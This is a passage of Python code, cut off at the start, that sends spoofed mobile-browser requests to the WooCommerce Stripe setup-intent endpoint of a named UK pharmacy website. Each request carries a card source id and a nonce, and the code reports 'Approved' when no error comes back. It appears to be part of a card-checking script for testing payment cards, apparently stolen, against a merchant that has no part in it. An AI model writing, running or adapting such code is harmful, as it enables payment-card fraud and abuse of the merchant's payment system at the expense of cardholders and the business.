        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }

    data = {
        'stripe_source_id': id,
        'nonce': nonce,
    }
    try:
        response = r.post('https://aptekaleki24.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
        i = (response.json()['error']['message'])
        return i
    except:
        print(response.json())
        return 'Approved'
